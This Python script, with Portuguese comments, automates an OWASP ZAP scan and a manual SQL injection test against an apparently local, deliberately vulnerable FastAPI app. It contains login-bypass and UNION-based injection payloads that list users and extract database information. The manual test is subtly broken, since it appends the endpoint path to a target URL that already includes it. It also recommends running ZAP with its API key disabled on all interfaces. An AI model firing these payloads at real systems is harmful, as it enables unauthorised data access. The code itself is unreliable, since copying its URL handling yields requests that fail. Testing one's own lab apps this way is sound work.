import time
import json
import requests
from zapv2 import ZAPv2
import sys

def run_zap_scan(target_url):
    """
    Executa scan automatizado com OWASP ZAP
    """
    
    # CORREÇÃO: Configuração correta do proxy e API
    zap = ZAPv2(
        apikey='', 
        proxies={
            'http': 'http://127.0.0.1:8090',   # Mudar para 8090
            'https': 'http://127.0.0.1:8090'    # Mudar para 8090
        },
    )
    
    # Testar conexão com o ZAP
    try:
        print("Testando conexão com ZAP...")
        version = zap.core.version
        print(f"✅ Conectado ao ZAP versão: {version}")
    except Exception as e:
        print(f"❌ Erro ao conectar ao ZAP: {e}")
        print("\nVerifique se o ZAP está rodando:")
        print("docker run -p 8090:8090 ghcr.io/zaproxy/zaproxy:stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true")
        sys.exit(1)
    
    print(f"\nIniciando scan do ZAP para: {target_url}")
    
    # 1. Acessar a URL alvo
    print("\n1. Acessando URL alvo...")
    try:
        zap.urlopen(target_url)
        time.sleep(2)
        print("   ✅ URL acessada com sucesso")
    except Exception as e:
        print(f"   ❌ Erro ao acessar URL: {e}")
        return
    
    # 2. Executar spider
    print("\n2. Executando spider para descobrir endpoints...")
    try:
        scan_id = zap.spider.scan(target_url)
        print(f"   Spider iniciado com ID: {scan_id}")
        time.sleep(2)
        
        # Aguardar spider completar
        while int(zap.spider.status(scan_id)) < 100:
            print(f"   Spider progresso: {zap.spider.status(scan_id)}%")
            time.sleep(5)
        
        print("   ✅ Spider completado!")
    except Exception as e:
        print(f"   ❌ Erro no spider: {e}")
    
    # 3. Executar scan ativo
    print("\n3. Executando scan ativo (procurando SQL Injection)...")
    try:
        scan_id = zap.ascan.scan(target_url)
        print(f"   Scan ativo iniciado com ID: {scan_id}")
        
        # Aguardar scan completar
        while int(zap.ascan.status(scan_id)) < 100:
            print(f"   Scan ativo progresso: {zap.ascan.status(scan_id)}%")
            time.sleep(10)
        
        print("   ✅ Scan ativo completado!")
    except Exception as e:
        print(f"   ❌ Erro no scan ativo: {e}")
    
    # 4. Coletar alertas
    print("\n4. Coletando alertas de segurança...")
    try:
        alerts = zap.core.alerts()
        
        # Filtrar por SQL Injection
        sql_injection_alerts = []
        for alert in alerts:
            alert_name = alert.get('alert', '').lower()
            if 'sql' in alert_name or 'injection' in alert_name:
                sql_injection_alerts.append(alert)
        
        # Exibir resultados
        print("\n" + "="*60)
        print("RESULTADOS DO SCAN ZAP")
        print("="*60)
        
        print(f"\nTotal de alertas encontrados: {len(alerts)}")
        print(f"Alertas de SQL Injection: {len(sql_injection_alerts)}")
        
        for alert in sql_injection_alerts:
            print(f"\n⚠️  VULNERABILIDADE ENCONTRADA:")
            print(f"   Nome: {alert.get('alert')}")
            print(f"   Risco: {alert.get('risk')}")
            print(f"   URL: {alert.get('uri')}")
            print(f"   Descrição: {alert.get('description')[:200]}...")
        
        # Salvar relatório
        with open('zap_report.json', 'w') as f:
            json.dump(alerts, f, indent=2)
        
        print("\n✅ Relatório completo salvo em 'zap_report.json'")
        
    except Exception as e:
        print(f"❌ Erro ao coletar alertas: {e}")

def test_manually():
    """
    Teste manual simples sem ZAP
    """
    import requests
    
    target = "http://127.0.0.1:8000/users/search-vulnerable?username=test"
    
    print("\n" + "="*60)
    print("TESTE MANUAL DE SQL INJECTION")
    print("="*60)
    
    # Teste 1: Busca normal
    print("\n1. Testando busca normal...")
    response = requests.get(f"{target}/users/search-vulnerable?username=admin")
    print(f"   Status: {response.status_code}")
    print(f"   Response: {response.json()}")
    
    # Teste 2: SQL Injection - Login Bypass
    print("\n2. Testando SQL Injection (Login Bypass)...")
    payload = "admin' OR '1'='1"
    response = requests.get(f"{target}/users/search-vulnerable?username={payload}")
    print(f"   Payload: {payload}")
    print(f"   Status: {response.status_code}")
    
    if response.status_code == 200:
        data = response.json()
        if isinstance(data, list) and len(data) > 1:
            print(f"   ✅ VULNERABILIDADE CONFIRMADA! Retornou {len(data)} usuários")
            print(f"   Usuários encontrados: {[u['username'] for u in data]}")
        else:
            print(f"   Response: {data}")
    
    # Teste 3: SQL Injection - UNION Attack
    print("\n3. Testando SQL Injection (UNION Attack)...")
    payload = "' UNION SELECT sqlite_version(), 2, 3, 4 --"
    response = requests.get(f"{target}/users/search-vulnerable?username={payload}")
    print(f"   Payload: {payload}")
    
    if response.status_code == 200:
        data = response.json()
        if isinstance(data, list) and len(data) > 0:
            print(f"   ✅ Dados extraídos com sucesso!")
            print(f"   Informação obtida: {data}")
    
    print("\n" + "="*60)

if __name__ == "__main__":
    print("FERRAMENTA DE TESTE DE SEGURANÇA")
    print("="*60)
    
    # Primeiro, testar manualmente a vulnerabilidade
    test_manually()
    
    # Depois, tentar com ZAP
    print("\n\nINICIANDO TESTE COM OWASP ZAP")
    print("="*60)
    target = "http://127.0.0.1:8000"
    
    print("\nCertifique-se de que:")
    print("✅ A aplicação FastAPI está rodando (python app_vulneravel.py)")
    print("✅ O ZAP está rodando em modo daemon")
    print("\nPara iniciar o ZAP (em outro terminal):")
    print("docker run -p 8090:8090 ghcr.io/zaproxy/zaproxy:stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true")
    
    response = input("\nO ZAP está rodando? (s/N): ")
    
    if response.lower() == 's':
        run_zap_scan(target)
    else:
        print("\n❌ Teste ZAP cancelado. Execute os testes manuais acima para ver a SQL Injection em ação!")